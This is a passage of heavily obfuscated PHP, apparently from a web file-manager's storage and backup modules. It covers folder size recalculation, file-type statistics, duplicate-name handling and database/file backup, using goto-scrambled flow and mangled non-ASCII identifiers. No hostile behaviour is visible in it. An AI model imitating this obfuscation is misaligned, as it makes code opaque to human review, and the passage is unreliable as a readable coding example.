B¥ÎÉ‡¢’Ã: foreach ($A¡ôÊÂ²†È as $BËğíœÄã => $e«µªàùç) { $A¡ôÊÂ²†È[$BËğíœÄã] = intval($e«µªàùç); $this->sourceCacheClear($e«µªàùç); } $fĞà’Åˆµ = array($dñ—ôÍ›‰÷[394] => array($dñ—ôÍ›‰÷[7], $A¡ôÊÂ²†È)); $Aªœ‚Ç›… = array($dñ—ôÍ›‰÷[551] => USER_ID, $dñ—ôÍ›‰÷[415] => time()); goto Bù¢íËâ‚†; Bù¢íËâ‚†: $this->where($fĞà’Åˆµ)->save($Aªœ‚Ç›…); goto e˜Ñ°À‰Ä´; AÛÃ·î: $dñ—ôÍ›‰÷ =& $_SERVER[´¬]; if (!$A¡ôÊÂ²†È) { return; } if (!is_array($A¡ôÊÂ²†È)) { $A¡ôÊÂ²†È = array($A¡ôÊÂ²†È); } goto B¥ÎÉ‡¢’Ã; e˜Ñ°À‰Ä´: } public function folderSizeReset($A¯İá×¨ƒ†, $côë¿Ÿ†ä° = false) { goto C¹Î¸÷³š; C¹Î¸÷³š: $e»´ŞöØª =& $_SERVER[´¬]; if ($this->statusIgnoreResetSpace) { return; } $dŞŒÖóÕŒô = $this->sourceInfo($A¯İá×¨ƒ†); goto CƒÃÈÃÏ£ö; C¬Í´–ğÇ÷: $Cªåã­Ö[] = $dŞŒÖóÕŒô[$e»´ŞöØª[394]]; $f„¦Ì–Ëë = array($e»´ŞöØª[394] => array($e»´ŞöØª[409], $Cªåã­Ö)); if ($côë¿Ÿ†ä° < 0) { $f„¦Ì–Ëë[$e»´ŞöØª[78]] = array($e»´ŞöØª[973], abs($côë¿Ÿ†ä°)); } goto CÂãÖÒæò¹; FòîíìÄÎÊ: $D¾Æ°«»é† = array($dŞŒÖóÕŒô[$e»´ŞöØª[402]], $dŞŒÖóÕŒô[$e»´ŞöØª[482]]); TaskRun::timeLimitCall($Bˆ¼»öïì¬, $e»´ŞöØª[1978], $D¾Æ°«»é†, 1.5); goto eåê¬µã¡ö; CƒÃÈÃÏ£ö: $a±±åÈŒÈò = $e»´ŞöØª[1976] . $A¯İá×¨ƒ†; CacheLock::lock($a±±åÈŒÈò, 20); if ($côë¿Ÿ†ä° === !1) { $this->sourceCacheClear($A¯İá×¨ƒ†); $dŞŒÖóÕŒô = $this->sourceInfo($A¯İá×¨ƒ†); $f„¦Ì–Ëë = array($e»´ŞöØª[393] => $A¯İá×¨ƒ†, $e»´ŞöØª[420] => 0); $dğ¨„Çµ  = $this->where($f„¦Ì–Ëë)->sum($e»´ŞöØª[78]); $côë¿Ÿ†ä° = intval($dğ¨„Çµ ) - intval($dŞŒÖóÕŒô[$e»´ŞöØª[78]]); } goto c…‡¸š‰ø; c…‡¸š‰ø: if ($côë¿Ÿ†ä° == 0) { return CacheLock::unlock($a±±åÈŒÈò); } $Cªåã­Ö = $this->parentLevelArray($dŞŒÖóÕŒô[$e»´ŞöØª[485]]); if (!$Cªåã­Ö) { $Cªåã­Ö = array(); } goto C¬Í´–ğÇ÷; CÂãÖÒæò¹: $this->where($f„¦Ì–Ëë)->setAdd($e»´ŞöØª[78], $côë¿Ÿ†ä°); CacheLock::unlock($a±±åÈŒÈò); $Bˆ¼»öïì¬ = $e»´ŞöØª[1977] . $dŞŒÖóÕŒô[$e»´ŞöØª[402]] . $e»´ŞöØª[4] . $dŞŒÖóÕŒô[$e»´ŞöØª[482]]; goto FòîíìÄÎÊ; eåê¬µã¡ö: } public function folderSizeResetChildren($e¤ï™½¶•º) { goto CÄÔŒ¡å»†; a ËÁ¬­”Œ: $cš§ôãŸø[$f™¿ÇÀˆÆÇ[401]] = 0; $b…òİï‰ø¾ = $this->field($C‘Ôõ¥ìÒ¥)->where($cš§ôãŸø)->select(); if (!$b…òİï‰ø¾) { return; } goto fåÉ–Ï—İš; fåÉ–Ï—İš: $dò¼Î„‡–ó[] = $BÕ¦ÎÍŒŒÂ; $dò¼Î„‡–ó = array_to_keyvalue($dò¼Î„‡–ó, $f™¿ÇÀˆÆÇ[394]); foreach ($dò¼Î„‡–ó as $E‹æ˜Îä¡‰ => $e°·øê¹§Ú) { $dò¼Î„‡–ó[$E‹æ˜Îä¡‰][$f™¿ÇÀˆÆÇ[1980]] = $dò¼Î„‡–ó[$E‹æ˜Îä¡‰][$f™¿ÇÀˆÆÇ[78]]; $dò¼Î„‡–ó[$E‹æ˜Îä¡‰][$f™¿ÇÀˆÆÇ[78]] = 0; } goto eÎ—Âç¢—; FÃª¸‡å‚’: $cš§ôãŸø = array($f™¿ÇÀˆÆÇ[545] => 1, $f™¿ÇÀˆÆÇ[552] => array($f™¿ÇÀˆÆÇ[511], $BÕ¦ÎÍŒŒÂ[$f™¿ÇÀˆÆÇ[485]] . $e¤ï™½¶•º . $f™¿ÇÀˆÆÇ[512])); $C‘Ôõ¥ìÒ¥ = $f™¿ÇÀˆÆÇ[1979]; $dò¼Î„‡–ó = $this->field($C‘Ôõ¥ìÒ¥)->where($cš§ôãŸø)->select(); goto a ËÁ¬­”Œ; cÛ¤‰‡ÎŒ: foreach ($dò¼Î„‡–ó as $e°·øê¹§Ú) { if ($e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[78]] == $e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[1980]]) { continue; } $Bœ–½÷‹[] = array($f™¿ÇÀˆÆÇ[394], $e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[394]], $f™¿ÇÀˆÆÇ[78], $e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[78]]); } $this->saveAll($Bœ–½÷‹); goto fÔçßç¢ÎË; CÄÔŒ¡å»†: $f™¿ÇÀˆÆÇ =& $_SERVER[´¬]; $this->sourceCacheClear($e¤ï™½¶•º); $BÕ¦ÎÍŒŒÂ = $this->sourceInfo($e¤ï™½¶•º); goto FÃª¸‡å‚’; eÎ—Âç¢—: foreach ($b…òİï‰ø¾ as $e°·øê¹§Ú) { $C°ÀøÉ¸Ó© = $e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[476]] . $f™¿ÇÀˆÆÇ[33]; if (!isset($dò¼Î„‡–ó[$C°ÀøÉ¸Ó©])) { continue; } if ($e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[421]] == $dò¼Î„‡–ó[$C°ÀøÉ¸Ó©][$f™¿ÇÀˆÆÇ[421]]) { $dò¼Î„‡–ó[$C°ÀøÉ¸Ó©][$f™¿ÇÀˆÆÇ[78]] += $e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[78]]; } } foreach ($dò¼Î„‡–ó as $e°·øê¹§Ú) { $a‰¶ƒÈã¸ = $this->parentLevelArray($e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[485]]); foreach ($a‰¶ƒÈã¸ as $C°ÀøÉ¸Ó©) { $C°ÀøÉ¸Ó© = $C°ÀøÉ¸Ó© . $f™¿ÇÀˆÆÇ[33]; if (!isset($dò¼Î„‡–ó[$C°ÀøÉ¸Ó©])) { continue; } if ($e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[421]] == $dò¼Î„‡–ó[$C°ÀøÉ¸Ó©][$f™¿ÇÀˆÆÇ[421]]) { $dò¼Î„‡–ó[$C°ÀøÉ¸Ó©][$f™¿ÇÀˆÆÇ[78]] += $e°·øê¹§Ú[$f™¿ÇÀˆÆÇ[78]]; } } } $Bœ–½÷‹ = array(); goto cÛ¤‰‡ÎŒ; fÔçßç¢ÎË: } public function userSpaceReset($B·áÂ§³õÊ = false) { $dêÁñÚ—ä =& $_SERVER[´¬]; $FŠ¹¬î»¼‚ = $this->where(array($dêÁñÚ—ä[402] => self::TYPE_USER, $dêÁñÚ—ä[482] => $B·áÂ§³õÊ, $dêÁñÚ—ä[401] => 0))->sum($dêÁñÚ—ä[78]); $FŠ¹¬î»¼‚ = !$FŠ¹¬î»¼‚ || $FŠ¹¬î»¼‚ <= 0 ? 0 : $FŠ¹¬î»¼‚; Model($dêÁñÚ—ä[501])->userEdit($B·áÂ§³õÊ, array($dêÁñÚ—ä[1675] => $FŠ¹¬î»¼‚)); } public function targetSpaceUpdate($bÊÊ˜ ŠÒ¨, $cÇ‡½Ÿ‡§İ) { $F•…ùšØ =& $_SERVER[´¬]; if (!$cÇ‡½Ÿ‡§İ) { return; } if (!in_array($bÊÊ˜ ŠÒ¨, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $E¹§ó§ŸÕÏ = $this->targetSpaceSize($bÊÊ˜ ŠÒ¨, $cÇ‡½Ÿ‡§İ); if ($bÊÊ˜ ŠÒ¨ == self::TYPE_USER) { Model($F•…ùšØ[501])->userEdit($cÇ‡½Ÿ‡§İ, array($F•…ùšØ[1675] => $E¹§ó§ŸÕÏ)); } else { if ($bÊÊ˜ ŠÒ¨ == self::TYPE_GROUP) { Model($F•…ùšØ[484])->groupEdit($cÇ‡½Ÿ‡§İ, array($F•…ùšØ[1675] => $E¹§ó§ŸÕÏ)); } } } public function targetSpaceSize($D¯ªğ›¹, $CÑàÄŒ…ã‰) { goto b†ƒè©Î¹; b†ƒè©Î¹: $fÅ­÷Èõ§Ì =& $_SERVER[´¬]; $dÊé®†Š‚ = $this->sourceRoot($D¯ªğ›¹, $CÑàÄŒ…ã‰, !0); if (!$dÊé®†Š‚) { return 0; } goto eÁôï‘áŞ‹; c§óÜÀ±£×: $eŞÔíœ˜Å = array_to_keyvalue($eŞÔíœ˜Å, $fÅ­÷Èõ§Ì[33], $fÅ­÷Èõ§Ì[394]); $eŞÔíœ˜Å = array_unique(array_filter($eŞÔíœ˜Å)); if ($eŞÔíœ˜Å) { $C÷Ÿö¢ƒ‡Ä = array($fÅ­÷Èõ§Ì[408] => array($fÅ­÷Èõ§Ì[409], $eŞÔíœ˜Å)); $d×Ğğª°£ += floatval($this->where($C÷Ÿö¢ƒ‡Ä)->sum($fÅ­÷Èõ§Ì[78])); } goto C£ïŠ¶†à; C£ïŠ¶†à: $d×Ğğª°£ = !$d×Ğğª°£ || $d×Ğğª°£ <= 0 ? 0 : $d×Ğğª°£; return $d×Ğğª°£; goto eóĞ¾ä´¨²; eÁôï‘áŞ‹: $d×Ğğª°£ = floatval($dÊé®†Š‚[$fÅ­÷Èõ§Ì[78]]); $C÷Ÿö¢ƒ‡Ä = array($fÅ­÷Èõ§Ì[552] => array($fÅ­÷Èõ§Ì[511], $fÅ­÷Èõ§Ì[497] . $dÊé®†Š‚[$fÅ­÷Èõ§Ì[394]] . $fÅ­÷Èõ§Ì[512])); $eŞÔíœ˜Å = Model($fÅ­÷Èõ§Ì[419])->field($fÅ­÷Èõ§Ì[408])->where($C÷Ÿö¢ƒ‡Ä)->select(); goto c§óÜÀ±£×; eóĞ¾ä´¨²: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($c‡¥½ÜØëğ) { return $this->fileTypeProfile($c‡¥½ÜØëğ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($cÏè½²Èˆ‹) { return $this->fileTypeProfile($cÏè½²Èˆ‹, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Dõ¶¤¿­¶¼, $Cˆœ¢ëÜŠ¿) { goto cÍ‚®„¦¡; cÍ‚®„¦¡: $DÌŠÈŒœ± =& $_SERVER[´¬]; $eí„¯ÖóåÏ = $DÌŠÈŒœ±[1981] . $Dõ¶¤¿­¶¼ . $DÌŠÈŒœ±[71] . $Cˆœ¢ëÜŠ¿; $A¸ìË²ŒÜ = Cache::get($eí„¯ÖóåÏ); goto EÃÌ™éŸ¿; EÃÌ™éŸ¿: if ($A¸ìË²ŒÜ) { return $A¸ìË²ŒÜ; } $dÀîŠîÕï¼ = array($DÌŠÈŒœ±[545] => 0); if ($Dõ¶¤¿­¶¼ != !1) { $dÀîŠîÕï¼[$DÌŠÈŒœ±[482]] = $Dõ¶¤¿­¶¼; $dÀîŠîÕï¼[$DÌŠÈŒœ±[402]] = $Cˆœ¢ëÜŠ¿; } goto b‘Äó‰»¹; b‘Äó‰»¹: $AËÅÇ¬‚Ä = array(); $AËÅÇ¬‚Ä[$DÌŠÈŒœ±[1982]] = array($DÌŠÈŒœ±[1983] => LNG($DÌŠÈŒœ±[1982]), $DÌŠÈŒœ±[1984] => $this->where($dÀîŠîÕï¼)->count(), $DÌŠÈŒœ±[547] => $this->where($dÀîŠîÕï¼)->sum($DÌŠÈŒœ±[78])); $A”ÙÊÅ“ã = KodIO::fileTypeList(); goto bÚ‡¾Ú¬Å¥; bÚ‡¾Ú¬Å¥: foreach ($A”ÙÊÅ“ã as $B¿°­‡ÑÙ£ => $cÎ§†ôäİ) { $dÀîŠîÕï¼[$DÌŠÈŒœ±[403]] = $this->fileTypeWhere($B¿°­‡ÑÙ£); $AËÅÇ¬‚Ä[$B¿°­‡ÑÙ£] = array($DÌŠÈŒœ±[1983] => $cÎ§†ôäİ[$DÌŠÈŒœ±[28]], $DÌŠÈŒœ±[1984] => $this->where($dÀîŠîÕï¼)->count(), $DÌŠÈŒœ±[547] => $this->where($dÀîŠîÕï¼)->sum($DÌŠÈŒœ±[78])); } Cache::set($eí„¯ÖóåÏ, $AËÅÇ¬‚Ä, 1200); return $AËÅÇ¬‚Ä; goto aÙØë¬Ş‚›; aÙØë¬Ş‚›: } public function fileNameExist($a‚µóÛ˜Éô, $bæøŒÏìëÔ) { $CÕÌÔ®Â•Ë =& $_SERVER[´¬]; $aˆ°ÄÃ’É‹ = $this->where(array($CÕÌÔ®Â•Ë[476] => $a‚µóÛ˜Éô, $CÕÌÔ®Â•Ë[28] => $bæøŒÏìëÔ, $CÕÌÔ®Â•Ë[421] => 0))->find(); return is_array($aˆ°ÄÃ’É‹) ? $aˆ°ÄÃ’É‹[$CÕÌÔ®Â•Ë[394]] : !1; } public function childList($bŠøƒ‡Û±­) { goto D¬…äëßßê; a³ôœ¨œø: $däÙ¶ß†‘ = array($dÈºœÌƒ’Ã[476] => intval($bŠøƒ‡Û±­), $dÈºœÌƒ’Ã[421] => 0); $a†˜©Çö² = $this->where($däÙ¶ß†‘)->select(); $a†˜©Çö² = $a†˜©Çö² ? $a†˜©Çö² : array(); goto cÌË§ÍÄ×Õ; cÌË§ÍÄ×Õ: self::$cacheChildList[$F‰Ô¥‹] = $a†˜©Çö²; foreach ($a†˜©Çö² as $B…ß¢Âªï) { $F‰Ô¥‹ = $dÈºœÌƒ’Ã[436] . $B…ß¢Âªï[$dÈºœÌƒ’Ã[394]]; self::$cacheSourceInfo[$F‰Ô¥‹] = $B…ß¢Âªï; } return $a†˜©Çö²; goto eÖ¯Ö½ÒÄ; D¬…äëßßê: $dÈºœÌƒ’Ã =& $_SERVER[´¬]; $F‰Ô¥‹ = $dÈºœÌƒ’Ã[1959] . $bŠøƒ‡Û±­; if (isset(self::$cacheChildList[$F‰Ô¥‹])) { return self::$cacheChildList[$F‰Ô¥‹]; } goto a³ôœ¨œø; eÖ¯Ö½ÒÄ: } public function fileNameAuto($Fèí¢´ŒˆÏ, $BÙÇï›¬ä¿, $CÒÎñì²•ö = REPEAT_RENAME, $C¯á¨ÌÇß = false) { $D–«±õÆÂ— =& $_SERVER[´¬]; $E‡·Ôó„· = array($D–«±õÆÂ—[476] => $Fèí¢´ŒˆÏ, $D–«±õÆÂ—[421] => 0, $D–«±õÆÂ—[28] => array($D–«±õÆÂ—[379], $BÙÇï›¬ä¿ . $D–«±õÆÂ—[380])); $D†‹ìÈ¥ = $this->field($D–«±õÆÂ—[28])->where($E‡·Ôó„·)->select(); $dŞ‡ÍÄ²¥Ü = array_to_keyvalue($D†‹ìÈ¥, $D–«±õÆÂ—[33], $D–«±õÆÂ—[28]); return $this->fileNameAutoGet($dŞ‡ÍÄ²¥Ü, $BÙÇï›¬ä¿, $CÒÎñì²•ö, $C¯á¨ÌÇß); } public function fileNameAutoGet($b¥éèùª§Ÿ, $Fî¶µå¾—Ÿ, $A‹™‡”, $D”·¦•Š»†) { $F‡¹ŒêÁÂÍ =& $_SERVER[´¬]; if ($A‹™‡” == REPEAT_REPLACE || !$b¥éèùª§Ÿ || !in_array_not_case($Fî¶µå¾—Ÿ, $b¥éèùª§Ÿ) || $D”·¦•Š»† && $A‹™‡” != REPEAT_RENAME_FOLDER) { return $Fî¶µå¾—Ÿ; } if ($A‹™‡” == REPEAT_SKIP) { return !1; } $c¨÷Œ¼¾ = $F‡¹ŒêÁÂÍ[95] . get_path_ext($Fî¶µå¾—Ÿ); $c¨÷Œ¼¾ = $c¨÷Œ¼¾ == $F‡¹ŒêÁÂÍ[95] || $D”·¦•Š»† ? $F‡¹ŒêÁÂÍ[33] : $c¨÷Œ¼¾; for ($B…¸Ùãµ°İ = 1; $B…¸Ùãµ°İ <= count($b¥éèùª§Ÿ) + 1; $B…¸Ùãµ°İ++) { $aá¤İ¾‘ÌÏ = substr($Fî¶µå¾—Ÿ, 0, strlen($Fî¶µå¾—Ÿ) - strlen($c¨÷Œ¼¾)); $cÜñÒÈ¥‘ = $aá¤İ¾‘ÌÏ . "\50{$B…¸Ùãµ°İ}\x29{$c¨÷Œ¼¾}"; if (!in_array_not_case($cÜñÒÈ¥‘, $b¥éèùª§Ÿ)) { return $cÜñÒÈ¥‘; } } } } $AŠäáÅæ‘î = $_SERVER[$_SERVER[´¬][828]]; goto D­ñÅãÊœÎ; e‡”Üùµ”µ: class BackupDbFile { public function __construct() { } public function index() { goto F¬ó½¢¤; D‹ê„¼ßùÊ: $BùÍ´ÄÙñé = CONTROLLER_DIR . $d¾ÈÛä±•[768]; $DÌÚˆ‚µ£Ã = CONTROLLER_DIR . $d¾ÈÛä±•[769]; IO::copy($BùÍ´ÄÙñé, $b¬ëÑæ¦®º); goto bğÁ§Õ‘°°; F¬ó½¢¤: $d¾ÈÛä±• =& $_SERVER[´¬]; $B³ùˆÙÁœ¹ = Backup::get(); $A‡ƒ¹„·ë = $B³ùˆÙÁœ¹[$d¾ÈÛä±•[28]]; goto b¶„ï»¥òŒ; DÚ˜²‹§ö: if (!$fãÒ…ŒÎóæ) { return !1; } $BëÖ­Œ£Ş = array($d¾ÈÛä±•[762] => $fãÒ…ŒÎóæ, $d¾ÈÛä±•[763] => time()); Backup::set($BëÖ­Œ£Ş); goto aöÒÏ„‡ó; bğÁ§Õ‘°°: IO::copy($DÌÚˆ‚µ£Ã, $b¬ëÑæ¦®º); $C¢ÊŠƒ´ù•->end(); $BëÖ­Œ£Ş = array($d¾ÈÛä±•[770] => $fãÒ…ŒÎóæ, $d¾ÈÛä±•[771] => time()); goto fİò”¥¡ƒ; aöÒÏ„‡ó: $C¢ÊŠƒ´ù• = new TaskFileTransfer($d¾ÈÛä±•[764], $d¾ÈÛä±•[742], count($Bä‹‚‚Œ), LNG($d¾ÈÛä±•[743]) . $d¾ÈÛä±•[438] . LNG($d¾ÈÛä±•[745]) . $d¾ÈÛä±•[765]); $C¢ÊŠƒ´ù•->task[$d¾ÈÛä±•[723]] = $fãÒ…ŒÎóæ; foreach ($A‰‰æß¼[$d¾ÈÛä±•[74]] as $f¾´ò½ğ¬Ø) { $DŒÁ¤Œ„šœ = IO::move($f¾´ò½ğ¬Ø[$d¾ÈÛä±•[76]], $b¬ëÑæ¦®º); if (!$DŒÁ¤Œ„šœ) { $C¢ÊŠƒ´ù•->end(); $eàÀöñìæÓ = IO::getLastError($d¾ÈÛä±•[766] . $f¾´ò½ğ¬Ø[$d¾ÈÛä±•[76]] . $d¾ÈÛä±•[767] . $b¬ëÑæ¦®º . $d¾ÈÛä±•[503]); write_log($eàÀöñìæÓ, $d¾ÈÛä±•[742]); return !1; } } goto D‹ê„¼ßùÊ; b¶„ï»¥òŒ: $c¿…òŠ±ÁÚ = $this->tmpFilesPath() . "\142\x61\143\x6b\165\x70\x5f{$A‡ƒ¹„·ë}\x2f"; $b¬ëÑæ¦®º = $this->backupPath($B³ùˆÙÁœ¹); if (!($b¬ëÑæ¦®º = IO::mkdir($b¬ëÑæ¦®º))) { return !1; } goto dç¹ÖÎçÔ„; fİò”¥¡ƒ: Backup::set($BëÖ­Œ£Ş); return !0; goto Aµ˜›§òì; dç¹ÖÎçÔ„: $A‰‰æß¼ = IO::listPath($c¿…òŠ±ÁÚ); $Bä‹‚‚Œ = isset($A‰‰æß¼[$d¾ÈÛä±•[74]]) ? $A‰‰æß¼[$d¾ÈÛä±•[74]] : array(); $fãÒ…ŒÎóæ = array_sum(array_column($Bä‹‚‚Œ, $d¾ÈÛä±•[78])); goto DÚ˜²‹§ö; Aµ˜›§òì: } private function backupPath($fÙ˜‰Ã¼¿Ş) { $e‡¬îµê¢‰ =& $_SERVER[´¬]; $D¿®±ÁÔÁí = $fÙ˜‰Ã¼¿Ş[$e‡¬îµê¢‰[28]]; $f¶¬Æçê™æ = Model($e‡¬îµê¢‰[730])->get($e‡¬îµê¢‰[731]); $BêŒé´ƒÆ = substr(md5($e‡¬îµê¢‰[732] . $f¶¬Æçê™æ . $D¿®±ÁÔÁí), 0, 8); return "\173\x69\x6f\x3a{$fÙ˜‰Ã¼¿Ş[$e‡¬îµê¢‰[715]]}\x7d\57\144\x61\x74\x61\142\x61\x73\x65\x2f\x62\x61\143\153\x75\x70\x2f" . $D¿®±ÁÔÁí . $e‡¬îµê¢‰[71] . $BêŒé´ƒÆ; } private function tmpFilesPath() { $CãõéÛ¹¸œ =& $_SERVER[´¬]; $dÈ°Á±¾²¿ = TEMP_FILES; if ($GLOBALS[$CãõéÛ¹¸œ[6]][$CãõéÛ¹¸œ[88]][$CãõéÛ¹¸œ[760]]) { $dÈ°Á±¾²¿ = $GLOBALS[$CãõéÛ¹¸œ[6]][$CãõéÛ¹¸œ[88]][$CãõéÛ¹¸œ[760]]; if (!mk_dir($dÈ°Á±¾²¿) || !is_writable($dÈ°Á±¾²¿) || !IO::mkfile($dÈ°Á±¾²¿ . $CãõéÛ¹¸œ[761])) { $dÈ°Á±¾²¿ = TEMP_FILES; } } return $dÈ°Á±¾²¿; } } class BackupFile { public function __construct() { } public function index() { goto b³‡à—ª‹; C¿ãĞß“İ„: $this->_fileFilter($FÁÕĞ´êğº); return !0; goto cÓçòÃã÷; Aáš¡öÖÅä: $E‘Ã¼éÔŠ¹->task[$_SERVER[´¬][723]] = $BÕ‹Œ¶±¥; $eëË³ÎŠğ  = array($_SERVER[´¬][776] => $céõ¡á©Ö, $_SERVER[´¬][777] => $BÕ‹Œ¶±¥, $_SERVER[´¬][778] => time()); Backup::set($eëË³ÎŠğ ); goto DÎ“Ì³¾¾‘; a¯éæØÊ: $Cƒ©¡Ñ“áï = 1000; $a±œ¯œÒŠÂ = $aÂÉó¸ˆ‰ = 0; $FÁÕĞ´êğº = array(); goto b»ù­œ²¨á; DÎ“Ì³¾¾‘: $FÁŒ‹ÃŠ„ = !0; $b«ƒä—Ö = $this->storeIds(); $fÚ„ñàÚ¤ˆ = 1; goto a¯éæØÊ; d°Ì¶ñÙô±: $eëË³ÎŠğ  = array($_SERVER[´¬][788] => 1, $_SERVER[´¬][474] => time(), $_SERVER[´¬][735] => 1, $_SERVER[´¬][785] => $fë‡›Ã±ÔÎ, $_SERVER[´¬][777] => $BÕ‹Œ¶±¥, $_SERVER[´¬][776] => $céõ¡á©Ö, $_SERVER[´¬][789] => time()); if ($aÂÉó¸ˆ‰) { $eëË³ÎŠğ [$_SERVER[´¬][786]] = $A”‘‚¾Á•ë; $eëË³ÎŠğ [$_SERVER[´¬][787]] = $DÈ‘‰ŞŞ; } Backup::set($eëË³ÎŠğ ); goto C¿ãĞß“İ„; d‘Ë—Ù Í‹: $céõ¡á©Ö = (int) Model($_SERVER[´¬][747])->where($Aí¾¼•ßÅ°)->count($_SERVER[´¬][445]); $BÕ‹Œ¶±¥ = (int) Model($_SERVER[´¬][747])->where($Aí¾¼•ßÅ°)->sum($_SERVER[´¬][78]); $E‘Ã¼éÔŠ¹ = new TaskFileTransfer($_SERVER[´¬][774], $_SERVER[´¬][742], $céõ¡á©Ö, LNG($_SERVER[´¬][743]) . $_SERVER[´¬][744] . LNG($_SERVER[´¬][775])); goto Aáš¡öÖÅä; b»ù­œ²¨á: $DÈ‘‰ŞŞ = $A”‘‚¾Á•ë = 0; do { $CåÆ¹®ñ‹ = $_SERVER[´¬][779]; $A†µèÁ‘÷ä = Model($_SERVER[´¬][747])->where($Aí¾¼•ßÅ°)->field($CåÆ¹®ñ‹)->order($_SERVER[´¬][780])->selectPage($Cƒ©¡Ñ“áï, $fÚ„ñàÚ¤ˆ); $Bâ¨¿½ğğï = !empty($A†µèÁ‘÷ä[$_SERVER[´¬][366]]) ? $A†µèÁ‘÷ä[$_SERVER[´¬][366]] : array(); foreach ($Bâ¨¿½ğğï as $E±¶ö…ØÂ¼) { goto CÆµ¶’Ú†; AØ•†åí°ù: $a±œ¯œÒŠÂ += $E±¶ö…ØÂ¼[$_SERVER[´¬][78]]; $A”‘‚¾Á•ë += 1; $DÈ‘‰ŞŞ += $E±¶ö…ØÂ¼[$_SERVER[´¬][78]]; goto cæ¬ÁàÁóÄ; CÆµ¶’Ú†: if (!$this->_fileExist($E±¶ö…ØÂ¼, $FÁÕĞ´êğº, $b«ƒä—Ö)) { $céõ¡á©Ö -= 1; $BÕ‹Œ¶±¥ -= (int) $E±¶ö…ØÂ¼[$_SERVER[´¬][78]]; write_log("\146\x69\154\145\40\x6e\157\164\40\145\x78\x69\163\164\x2e\146\x69\x6c\x65\111\x44\72{$E±¶ö…ØÂ¼[$_SERVER[´¬][445]]}\x2c\x20\160\141\x74\x68\x3a{$E±¶ö…ØÂ¼[$_SERVER[´¬][76]]}", $_SERVER[´¬][781]); continue; } $aÒë„º– = $E±¶ö…ØÂ¼[$_SERVER[´¬][76]]; $c‹ÖªœÁé = "\x7b\x69\157\72{$bˆé…ï„¸×[$_SERVER[´¬][715]]}\175" . substr($aÒë„º–, strlen("\x7b\x69\x6f\72{$E±¶ö…ØÂ¼[$_SERVER[´¬][782]]}\175")); goto bÛšôóã¢; bÛšôóã¢: if (IO::exist($c‹ÖªœÁé)) { $E‘Ã¼éÔŠ¹->updateFileEnd($E±¶ö…ØÂ¼[$_SERVER[´¬][28]], $E±¶ö…ØÂ¼[$_SERVER[´¬][78]]); } else { $c‹ÖªœÁé = get_path_father($c‹ÖªœÁé); IO::mkdir($c‹ÖªœÁé); if (!IO::copy($aÒë„º–, $c‹ÖªœÁé, $_SERVER[´¬][783])) { write_log($_SERVER[´¬][784] . $aÒë„º– . $_SERVER[´¬][767] . $c‹ÖªœÁé . $_SERVER[´¬][503], $_SERVER[´¬][742]); $FÁŒ‹ÃŠ„ = !1; break; } } $fë‡›Ã±ÔÎ = $E±¶ö…ØÂ¼[$_SERVER[´¬][445]]; $aÂÉó¸ˆ‰ += 1; goto AØ•†åí°ù; cæ¬ÁàÁóÄ: if ($a±œ¯œÒŠÂ >= 1024 * 1024 * 100) { $eëË³ÎŠğ  = array($_SERVER[´¬][785] => $fë‡›Ã±ÔÎ, $_SERVER[´¬][786] => $A”‘‚¾Á•ë, $_SERVER[´¬][787] => $DÈ‘‰ŞŞ); Backup::set($eëË³ÎŠğ ); $a±œ¯œÒŠÂ = $aÂÉó¸ˆ‰ = 0; } goto fÍä‡óÑ¦; fÍä‡óÑ¦: } $Bİ¾ìø¦ÚŠ = count($Bâ¨¿½ğğï); $fÚ„ñàÚ¤ˆ++; } while ($Bİ¾ìø¦ÚŠ == $Cƒ©¡Ñ“áï); $E‘Ã¼éÔŠ¹->end(); goto d°Ì¶ñÙô±; b³‡à—ª‹: $bˆé…ï„¸× = Backup::get(); $fë‡›Ã±ÔÎ = $bˆé…ï„¸×[$_SERVER[´¬][290]][$_SERVER[´¬][192]][$_SERVER[´¬][445]]; $Aí¾¼•ßÅ° = array($_SERVER[´¬][446] => array($_SERVER[´¬][772], $fë‡›Ã±ÔÎ), $_SERVER[´¬][773] => array($_SERVER[´¬][328], $bˆé…ï„¸×[$_SERVER[´¬][715]])); goto d‘Ë—Ù Í‹; cÓçòÃã÷: } private function _fileExist($a™Ù÷³æøŸ, &$f‚‚Ã“´Ä®, $dù°ÅÛ»§) { goto c‚„ëËç–„; fä¤–“‚–Œ: $f‚‚Ã“´Ä® = array_merge($f‚‚Ã“´Ä®, array_to_keyvalue($bÇÁ„Ÿ°ì„, $Bôó³ø¨¡[33], $Bôó³ø¨¡[445])); return !1; goto aùçòãÀ—ğ; dİ×µ¸Ô”: if (IO::exist($C“½‡Ş¬†à)) { $f‚‚Ã“´Ä®[] = $a™Ù÷³æøŸ[$Bôó³ø¨¡[445]]; return !1; } $c¢²Òœ¾ì = array($Bôó³ø¨¡[782] => $a™Ù÷³æøŸ[$Bôó³ø¨¡[782]], $Bôó³ø¨¡[76] => array($Bôó³ø¨¡[379], "{$C“½‡Ş¬†à}\x25")); $bÇÁ„Ÿ°ì„ = Model($Bôó³ø¨¡[747])->where($c¢²Òœ¾ì)->field($Bôó³ø¨¡[446])->select(); goto fä¤–“‚–Œ; c‚„ëËç–„: $Bôó³ø¨¡ =& $_SERVER[´¬]; $A¯‚¿¼ùùŠ = $a™Ù÷³æøŸ[$Bôó³ø¨¡[76]]; if (in_array($a™Ù÷³æøŸ[$Bôó³ø¨¡[445]], $f‚‚Ã“´Ä®)) { return !1; } goto BÉğ£ñÉºä; BÉğ£ñÉºä: if (!in_array($a™Ù÷³æøŸ[$Bôó³ø¨¡[782]], $dù°ÅÛ»§)) { return !1; } if (IO::exist($A¯‚¿¼ùùŠ)) { return !0; } $C“½‡Ş¬†à = get_path_father($A¯‚¿¼ùùŠ); goto dİ×µ¸Ô”; aùçòãÀ—ğ: } private function _fileFilter($E®Å´äƒº) { $CªğˆÒàÎ =& $_SERVER[´¬]; if (empty($E®Å´äƒº)) { return; } $a¬¶£Üíµ¼ = 